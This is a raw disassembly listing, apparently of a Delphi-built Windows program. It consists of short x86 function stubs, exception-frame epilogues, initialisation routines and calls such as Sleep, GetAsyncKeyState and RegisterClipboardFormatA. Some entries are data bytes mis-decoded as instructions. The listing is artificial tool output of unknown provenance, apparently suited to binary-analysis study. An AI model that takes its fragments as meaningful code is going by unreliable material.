sub_4823d4
mov edx [ eax ]
call [ edx + 0xc ]
retn
sub_4823dc
retn
sub_4823e0
push ebx
push esi
mov esi edx
mov ebx eax
mov ecx esi
mov edx r-xdata
mov eax [ ebx + 0x8 ]
call sub_480c80
pop esi
pop ebx
retn
sub_48240c
push ebx
push esi
mov esi edx
mov ebx eax
mov ecx esi
mov edx r-xdata
mov eax [ ebx + 0x8 ]
call sub_480c80
pop esi
pop ebx
retn
sub_482435
add [ eax ] al
add [ ebx + 0x8408bca ] cl
mov edx r-xdata
call sub_480ea0
retn
sub_482459
add [ eax ] al
add [ ebx + 0x8408bca ] cl
mov edx r-xdata
call sub_480ea0
retn
sub_48255a
jmp sub_4046f8
sub_482561
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_482583
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_404e68
retn
sub_48257c
jmp sub_4046f8
sub_482583
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4826bd
lea eax [ ebp - 0x20 ]
mov edx 0x6
call sub_404e68
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_4826d3
jmp sub_4046f8
j_sub_4826bd
jmp sub_4826bd
sub_4826da
movzx eax [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_482740
mov eax 0x1
retn
sub_4827aa
jmp sub_4046f8
sub_4827b1
pop ebx
pop ebp
retn
sub_482878
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4828f0
retn
sub_4828e2
jmp sub_4046f8
sub_4828e9
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_482ebf
jmp sub_4046f8
sub_482ec6
mov esp ebp
pop ebp
retn 0x4
sub_482f5a
jmp sub_4046f8
sub_482f61
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_483066
jmp sub_4046f8
sub_48308a
jmp sub_4046f8
sub_48310a
jmp sub_4046f8
sub_483111
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4831c6
jmp sub_4046f8
sub_4831cd
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_483215
jmp sub_4046f8
sub_48321c
pop ebx
pop ecx
pop ebp
retn
sub_483220
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
pop esi
pop ebx
retn
sub_483322
jmp sub_4046f8
sub_483329
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_483492
jmp sub_4046f8
sub_483499
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48372e
jmp sub_4046f8
sub_483758
jmp sub_4046f8
sub_48375f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_483844
jmp sub_404444
sub_48386f
jmp sub_4046f8
sub_483876
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_483888
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_483234
pop esi
pop ebx
retn
sub_483963
jmp sub_4046f8
sub_48396a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_483ad0
jmp sub_4046f8
sub_483ad7
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_483b50
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_48389c
pop esi
pop ebx
retn
sub_483cf8
jmp sub_4046f8
sub_483cff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_483d29
lea eax [ ebp - 0x18 ]
mov edx 0x3
call sub_404e68
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_483d22
jmp sub_4046f8
sub_483d29
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48409e
jmp sub_4046f8
sub_4840a5
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4840ac
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_483780
retn
sub_4840bc
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_483b14
retn
sub_4840f0
sub dl 0x1
jb r-xdata
mov eax [ eax + 0x20 ]
call sub_40f854
retn
je r-xdata
mov eax [ eax + 0x20 ]
call sub_40f794
jmp r-xdata
retn
sub_48415d
jmp sub_4046f8
sub_484164
pop ebp
retn
sub_484578
jmp sub_4046f8
sub_48459a
jmp sub_4046f8
sub_4845ca
jmp sub_4046f8
sub_4845d1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4846c2
jmp sub_4046f8
sub_4846c9
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_484734
jmp sub_4046f8
sub_48473b
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4847a0
jmp sub_4046f8
sub_4847a7
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4847d0
push ebx
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx [ eax + 0x48 ]
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_4847e8
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx [ eax + 0x48 ]
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_484939
jmp sub_4046f8
sub_484940
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48495d
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_484956
jmp sub_4046f8
sub_48495d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4849e1
fiadd [ ecx ]
mov ebp ds
inc ecx
add ah dl
fiadd [ ecx ]
int3
sub_484c2b
jmp sub_4046f8
sub_484c32
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_484d1e
jmp sub_4046f8
sub_484d25
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_484eb9
jmp sub_4046f8
sub_484ec0
pop ebp
retn
sub_4850ba
jmp sub_4046f8
sub_4850c1
pop ebp
retn
sub_485f34
jmp sub_4046f8
sub_485f3b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48622b
jmp sub_4046f8
sub_486232
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48631b
mov eax [ esi + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_48637c
call sub_416f68
retn
sub_48645c
push ebx
mov ebx eax
lea eax [ ebx + 0x10 ]
call sub_404e44
lea eax [ ebx + 0x14 ]
call sub_404e44
lea eax [ ebx + 0x8 ]
call sub_404e44
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_48653a
jmp sub_4046f8
sub_486541
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_48668b
dec [ ebp - 0x3f451fb3 ]
dec eax
add [ ebx - 0x5a1a173a ] cl
sub_486741
jmp sub_4046f8
sub_486748
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48693b
jmp [ esi ]
sub_486ba1
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404e68
retn
sub_486baf
jmp sub_4046f8
j_sub_486ba1
jmp sub_486ba1
sub_486bb6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_486df4
push esi
mov esi eax
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_486e04
push esi
mov esi eax
mov eax [ esi + 0x7c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_486eea
jmp sub_4046f8
sub_486ef1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4870b1
lea eax [ ebp - 0x34 ]
call sub_404e44
lea eax [ ebp - 0x28 ]
call sub_404e44
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404e68
retn
sub_4870cf
jmp sub_4046f8
j_sub_4870b1
jmp sub_4870b1
sub_4870d6
pop ebx
mov esp ebp
pop ebp
retn
sub_487d4e
jmp sub_4046f8
sub_487d55
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_487ded
jmp sub_4046f8
sub_487df4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_487e11
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_487e0a
jmp sub_4046f8
sub_487e11
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_487ede
jmp sub_4046f8
sub_487ee5
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_48815d
jmp sub_4046f8
sub_488164
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48821b
jmp sub_4046f8
sub_488222
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
j_sub_404570#3
jmp sub_404570
sub_48849d
jmp sub_4046f8
sub_4884c7
jmp sub_4046f8
sub_4884ce
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_488929
jmp sub_4046f8
sub_488958
jmp sub_4046f8
sub_48895f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_404570#2
jmp sub_404570
sub_488df6
jmp sub_404444
sub_488e31
jmp sub_4046f8
sub_488ebe
jmp sub_4046f8
sub_488ec5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_488fa0
mov [ eax + 0x10c ] dl
retn
sub_48911c
jmp sub_4046f8
sub_489123
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489145
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_404e68
retn
sub_48913e
jmp sub_4046f8
sub_489145
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48946d
jmp sub_4046f8
sub_489474
movzx eax [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_489543
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_404444
sub_489739
jmp sub_4046f8
sub_489740
movzx eax [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_489758
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_489778
mov edx [ eax + 0x88 ]
mov eax esi
call sub_404e98
pop esi
pop ebx
retn
sub_489840
mov eax [ eax + 0x128 ]
mov eax [ eax + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_4898ab
jmp sub_4046f8
sub_4898b2
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_489aa1
jmp sub_4046f8
sub_489aa8
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_489b77
jmp sub_4046f8
sub_489b7e
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_489df2
jmp sub_404444
sub_489e30
jmp sub_4046f8
sub_489e37
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_404570#8
jmp sub_404570
j_sub_489f23
jmp sub_489f23
sub_489f49
jmp sub_4046f8
sub_489f50
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_48a07d
jmp sub_4046f8
sub_48a09a
jmp sub_4046f8
sub_48a0a1
mov ebx [ ebp - 0x18 ]
mov esp ebp
pop ebp
retn
sub_48a12b
jmp sub_4046f8
sub_48a132
pop ecx
pop ecx
pop ebp
retn
sub_48a3e7
jmp sub_404444
sub_48a414
jmp sub_4046f8
sub_48a582
jmp sub_4046f8
sub_48a589
movzx eax [ ebp - 0x15 ]
mov edi [ ebp - 0x28 ]
mov esi [ ebp - 0x24 ]
mov ebx [ ebp - 0x20 ]
mov esp ebp
pop ebp
retn
sub_48a93c
jmp sub_4046f8
sub_48a943
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48a96d
lea eax [ ebp - 0x18 ]
mov edx 0x3
call sub_404e68
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_48a966
jmp sub_4046f8
sub_48a96d
mov edi [ ebp - 0x24 ]
mov esi [ ebp - 0x20 ]
mov ebx [ ebp - 0x1c ]
mov esp ebp
pop ebp
retn 0x10
sub_48a9b8
jmp sub_4046f8
sub_48a9bf
pop ebp
retn
sub_48ab1c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_402d28
pop ebp
retn
sub_48ab2c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_402d44
pop ebp
retn
sub_48ab64
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0xc ]
imul ecx [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn
sub_48ab80
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0xc ]
imul ecx [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ebp
retn
sub_48ab9c
push ebp
mov ebp esp
xor eax eax
pop ebp
retn
sub_48ac10
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
pop ebx
retn
sub_48ac8d
jmp sub_4046f8
sub_48ac94
pop ebx
mov esp ebp
pop ebp
retn
sub_48ac9c
retn
sub_48aca0
retn
sub_48aca4
retn
sub_48aca8
mov edx [ eax ]
xor ecx ecx
mov [ edx + 0x6c ] ecx
xor eax eax
mov [ edx + 0x14 ] eax
retn
sub_48ace8
retn
sub_48af58
push ebx
mov ebx eax
cmp [ ebx + 0xb8 ] 0x0
je r-xdata
pop ebx
retn
lea eax [ ebx + 0xb8 ]
call sub_49781c
xor eax eax
mov [ ebx + 0xb8 ] eax
sub_48b16c
jmp sub_404444
sub_48b20b
jmp sub_4046f8
sub_48b218
call sub_425b34
retn
sub_48b527
jmp sub_4046f8
sub_48b52e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48b54b
mov eax [ ebp - 0x10 ]
call sub_403f64
retn
sub_48b544
jmp sub_4046f8
j_sub_404570
jmp sub_404570
sub_48b58c
jmp sub_4046f8
sub_48b604
push ebx
mov ebx eax
mov eax [ ebx + 0x2c ]
call sub_403f64
xor eax eax
mov [ ebx + 0x2c ] eax
pop ebx
retn
sub_48bb0d
jmp sub_4046f8
sub_48bb1e
jmp sub_404570
sub_48bb4d
jmp sub_4046f8
sub_48bc4c
mov edx [ eax + 0x28 ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
retn
call sub_48b220
sub_48bca0
push ebx
mov ebx eax
mov eax [ ebx + 0x2c ]
call sub_403f64
mov dl 0x1
mov eax [ r-xdata ]
call sub_42830c
mov [ ebx + 0x2c ] eax
pop ebx
retn
sub_48be32
jmp sub_4046f8
sub_48bee6
jmp sub_4046f8
sub_48beed
pop ecx
pop ebp
retn
sub_48bf86
jmp sub_4046f8
sub_48bf8d
pop ecx
pop ebp
retn
sub_48c0ec
call sub_49781c
retn
sub_48c0f4
call sub_4977dc
retn
sub_48d134
push edx
call sub_48ab1c
pop ecx
retn
sub_48d13c
push edx
call sub_48ab2c
pop ecx
retn
sub_48d144
push edx
call sub_48ab1c
pop ecx
retn
sub_48d14c
push edx
call sub_48ab2c
pop ecx
retn
sub_48d154
push ebp
mov ebp esp
mov eax ecx
pop ebp
retn 0x4
sub_48d160
mov edx [ eax ]
mov [ edx + 0x14 ] 0x31
mov ecx [ eax ]
call [ ecx ]
retn
sub_48d170
xor eax eax
retn
sub_48d174
retn
sub_48d59c
mov eax [ eax + 0x1b4 ]
mov [ eax ] sub_48d5ac
retn
sub_48d6dc
mov eax [ eax + 0x18 ]
mov [ eax + 0x24 ] 0x1
retn
sub_48d784
retn
sub_48e220
push ebx
cmp [ eax + 0x54 ] 0x0
mov ebx [ eax + 0x1a4 ]
je r-xdata
inc [ ebx + 0xc ]
pop ebx
retn
mov edx [ eax + 0x1cc ]
call [ edx + 0x8 ]
sub_48fc4c
mov edx [ eax + 0x1c4 ]
xor ecx ecx
mov [ edx + 0x24 ] ecx
mov eax [ eax + 0x74 ]
mov [ edx + 0x2c ] eax
retn
sub_490558
retn
sub_4912c8
retn
sub_4912cc
mov edx [ eax ]
mov [ edx + 0x14 ] 0x2e
mov ecx [ eax ]
call [ ecx ]
retn
sub_49240c
push ebx
mov ebx [ eax + 0x1cc ]
mov edx [ ebx + 0x10 ]
mov [ eax + 0x88 ] edx
mov edx [ ebx + 0x14 ]
call sub_491a78
mov [ ebx + 0x1c ] 0x1
pop ebx
retn
sub_492430
retn
sub_492540
mov eax [ eax + 0x1cc ]
mov [ eax + 0x1c ] 0x1
retn
sub_492d94
xor edx edx
mov [ eax + 0x94 ] edx
call sub_492d48
retn
sub_493020
xor eax eax
retn
sub_49439c
mov edx [ eax + 0x1c4 ]
mov ecx [ eax + 0x138 ]
mov [ edx + 0x5c ] ecx
mov eax [ eax + 0x74 ]
mov [ edx + 0x60 ] eax
retn
sub_4944b4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn 0x4
sub_4944c0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
pop ebp
retn 0x4
sub_497422
pop esi
pop ebx
retn
sub_4977bc
shl ecx 0x7
push ecx
push eax
push edx
call sub_48ab50
add esp 0xc
retn
sub_49783c
push ebx
mov ecx 0x84
xor edx edx
mov ebx [ eax + 0x4 ]
call [ ebx ]
xor edx edx
mov [ eax + 0x80 ] edx
pop ebx
retn
sub_498630
call sub_49781c
retn
sub_498638
call sub_4977dc
retn
sub_498824
mov ecx [ eax + 0x158 ]
call [ ecx + 0x18 ]
retn
sub_498b64
retn
sub_498e98
call sub_498928
retn
sub_499078
mov edx 0xd9
call sub_498958
retn
sub_49af54
retn
sub_49b1a4
retn
sub_49c238
push ebx
mov ebx eax
mov ecx 0x7
mov edx 0x7f
mov eax ebx
call sub_49c19c
xor eax eax
xor edx edx
mov [ ebx + 0x18 ] eax
mov [ ebx + 0x1c ] edx
pop ebx
retn
sub_49dd27
jmp sub_4046f8
sub_49dd2e
pop ebp
retn
sub_49dd30
push ebx
push esi
mov bl 0xb
mov esi rw-data
mov eax [ esi ]
call sub_403f64
add esi 0x4
dec bl
jne r-xdata
pop esi
pop ebx
retn
sub_49ddf4
jmp sub_4046f8
sub_49ddfb
pop ebp
retn
sub_49de3c
jmp sub_4046f8
sub_49de43
pop ebp
retn
sub_49ded5
jmp sub_4046f8
sub_49dedc
pop ebp
retn
sub_49df24
jmp sub_4046f8
sub_49df2b
pop ebp
retn
sub_49dfe4
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ebp
retn 0x4
sub_49e067
jmp sub_4046f8
sub_49e06e
pop ebp
retn
sub_49e4d2
jmp sub_404444
sub_49e50f
jmp sub_4046f8
sub_49e516
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_49e5d7
[ eax + eax ]
sub_49e62b
jmp sub_4046f8
sub_49e632
pop ebp
retn
sub_49e809
jmp sub_404444
sub_49e9e7
jmp sub_404444
sub_49ea5b
jmp sub_4046f8
sub_49ea62
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_49eb03
[ esi ]
sub_49edc6
jmp sub_404444
sub_49efb6
jmp sub_404444
sub_49eff8
jmp sub_4046f8
sub_49efff
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_49f04b
jmp [ edx ]
sub_49f1da
jmp sub_4046f8
sub_49f1e1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49f1fe
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_49f1f7
jmp sub_4046f8
sub_49f1fe
mov esp ebp
pop ebp
retn
sub_49f2a1
jmp sub_4046f8
sub_49f2a8
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_49f742
jmp sub_4046f8
sub_49f749
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_49f812
jmp sub_404444
sub_49f834
jmp sub_4046f8
sub_49f83b
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_49f864
push eax
call Sleep
retn
sub_49f974
jmp sub_4046f8
sub_49f97b
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_49fa7d
jmp sub_4046f8
sub_49fa84
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_49fc53
jmp sub_404444
sub_49fc93
jmp sub_4046f8
sub_49fc9a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49fcb7
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_49fcb0
jmp sub_4046f8
sub_49fcb7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4a0265
jmp sub_404444
sub_4a041b
jmp sub_404444
sub_4a089f
jmp sub_404444
sub_4a0aea
jmp sub_404444
sub_4a0bea
jmp sub_404444
j_sub_404444#9
jmp sub_404444
j_sub_404444#8
jmp sub_404444
sub_4a1103
jmp sub_404444
sub_4a119a
jmp sub_404444
j_sub_404444#7
jmp sub_404444
sub_4a157a
jmp sub_404444
sub_4a1635
jmp sub_404444
j_sub_404444#6
jmp sub_404444
j_sub_404444#5
jmp sub_404444
sub_4a1dcc
jmp sub_404444
sub_4a1fb1
jmp sub_404444
sub_4a25ce
jmp sub_404444
sub_4a27a5
jmp sub_4046f8
sub_4a28d0
jmp sub_404444
sub_4a2ad5
jmp sub_404444
j_sub_404444#4
jmp sub_404444
j_sub_404444#3
jmp sub_404444
sub_4a30de
jmp sub_4046f8
sub_4a3319
jmp sub_4046f8
sub_4a3323
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4a33ef
jmp [ eax ]
sub_4a34c7
[ eax ]
j_sub_404444#2
jmp sub_404444
sub_4a382e
jmp sub_4046f8
sub_4a3872
jmp sub_4046f8
sub_4a3879
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4a3920
jmp sub_404444
sub_4a395d
jmp sub_404444
j_sub_404444
jmp sub_404444
sub_4a39b3
jmp sub_4046f8
sub_4a39ba
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4a3e17
jmp sub_4046f8
sub_4a3e1e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4a3e33
jmp [ eax ]
sub_4a3e9b
jmp [ eax ]
sub_4a3fcd
jmp sub_4046f8
sub_4a3fd4
pop ebx
mov esp ebp
pop ebp
retn
sub_4a4018
push ebx
mov ebx eax
push ebx
call GetAsyncKeyState
movsx eax ax
and eax 0x8001
cmp eax 0x8001
sete al
pop ebx
retn
sub_4a4292
jmp sub_4046f8
sub_4a4299
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4a44b8
jmp sub_4046f8
j_sub_4046f8#9
jmp sub_4046f8
sub_4a4544
pop ebx
mov esp ebp
pop ebp
retn
sub_4a461c
jmp sub_4046f8
j_sub_4046f8#8
jmp sub_4046f8
j_sub_4046f8#7
jmp sub_4046f8
sub_4a470c
mov esp ebp
pop ebp
retn
sub_4a48ee
jmp sub_4046f8
sub_4a48f5
pop ebx
mov esp ebp
pop ebp
retn
sub_4a49f2
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
sub_4a4a00
jmp sub_4046f8
j_sub_4a49f2
jmp sub_4a49f2
sub_4a4a07
mov esp ebp
pop ebp
retn
sub_4a4af8
jmp sub_4046f8
sub_4a4aff
pop ebx
mov esp ebp
pop ebp
retn
sub_4a4d0e
jmp sub_4046f8
j_sub_4a4ccb
jmp sub_4a4ccb
sub_4a4d15
pop ebx
mov esp ebp
pop ebp
retn
j_sub_4046f8#6
jmp sub_4046f8
sub_4a4f1d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4a5041
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404e68
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_4a5057
jmp sub_4046f8
j_sub_4a5041
jmp sub_4a5041
sub_4a505e
pop ebx
mov esp ebp
pop ebp
retn
sub_4a5067
dec [ esi ]
add [ eax ] al
add [ edx ] dh
inc esp
xor eax 0x35353534
xor dh [ edx + esi ]
xor al 0x46
xor al [ eax + eax ]
call sub_461dc8
retn
sub_4a5084
call sub_45f6c0
retn
sub_4a508c
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4a39c4
retn
j_sub_4046f8#5
jmp sub_4046f8
sub_4a52c3
pop ebx
mov esp ebp
pop ebp
retn
sub_4a5302
retn
sub_4a5303
jmp sub_4046f8
j_sub_4a5302
jmp sub_4a5302
sub_4a530a
pop ebp
retn
sub_4a6098
sub [ rw-data ] 0x1
jae r-xdata
retn
xor eax eax
mov [ rw-data ] eax
sub_4a611e
jmp sub_4046f8
sub_4a6125
pop ebp
retn
j_sub_4046f8#4
jmp sub_4046f8
sub_4a61ec
pop ebp
retn
sub_4a61f0
sub [ rw-data ] 0x1
retn
j_sub_4046f8#3
jmp sub_4046f8
sub_4a6288
pop ebp
retn
sub_4a628c
sub [ rw-data ] 0x1
retn
sub_4a6294
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_4207b4
sub_4a62a4
sub [ rw-data ] 0x1
retn
sub_4a62ac
sub [ rw-data ] 0x1
retn
sub_4a63b0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a970
mov [ rw-data ] eax
sub_4a63cc
sub [ rw-data ] 0x1
retn
sub_4a6454
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ r-xdata ]
call sub_415ffc
mov edx [ r-xdata ]
mov eax [ sub_42e088 ]
call sub_416048
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
sub_4a64d8
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_4a652d
add [ eax ] al
add [ ebx + 0x4af4c02d ] al
add [ ecx ] al
jae r-xdata
retn
call sub_42ebdc
sub_4a6540
sub [ rw-data ] 0x1
retn
j_sub_4046f8#2
jmp sub_4046f8
sub_4a665d
pop ebp
retn
sub_4a6660
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_416048
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_416048
sub_4a66d7
add [ ebx + 0x4af6242d ] al
add [ ecx ] al
retn
sub_4a66e0
sub [ rw-data ] 0x1
retn
sub_4a66e8
sub [ rw-data ] 0x1
retn
sub_4a66f0
sub [ rw-data ] 0x1
retn
sub_4a67be
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_4a67c7
jmp sub_4046f8
j_sub_4a67be
jmp sub_4a67be
sub_4a67ce
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4a67d4
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_46afe4
sub_4a67e4
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_46b7b8
sub_4a67f4
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ r-xdata ]
call sub_4634dc
cmp eax 0x2
jne r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_46d678
sub_4a6828
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ r-xdata ]
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a970
mov [ rw-data ] eax
sub_4a6915
jmp sub_4046f8
sub_4a691c
pop ecx
pop ebp
retn
sub_4a693d
add [ eax ] al
add [ ebx + 0x4b04a82d ] al
add [ ecx ] al
jae r-xdata
retn
mov eax sub_4748bc
call sub_404b30
sub_4a6954
sub [ rw-data ] 0x1
retn
sub_4a695c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ r-xdata ]
call sub_4777f4
sub_4a6970
sub [ rw-data ] 0x1
jae r-xdata
retn
mov ecx rw-data
mov edx [ rw-data ]
mov eax [ r-xdata ]
call sub_481394
sub_4a6990
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax r-xdata
call sub_4820d0
sub_4a69ba
add [ eax ] al
sub [ rw-data ] 0x1
retn
sub_4a69c4
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_46468c
mov dl 0x1
mov eax [ r-xdata ]
call sub_484e1c
mov [ rw-data ] eax
sub_4a69f9
add [ eax ] al
add [ ebx + 0x4b05482d ] al
add [ ecx ] al
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_485048
mov [ rw-data ] eax
sub_4a6a18
sub [ rw-data ] 0x1
retn
j_sub_4046f8
jmp sub_4046f8
sub_4a6aaf
pop ecx
pop ecx
pop ebp
retn
sub_4a6ac7
inc [ ebx ]
add [ eax ] al
add [ edx + 0x70 ] ch
add [ bp + di + 0x542d ] al
add eax 0x7301004b
sbb edi [ eax + sub_49dd4c ]
call sub_404b58
mov eax rw-data
xor ecx ecx
mov edx 0x2c
call sub_403728
retn
sub_4a6af8
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_404b30
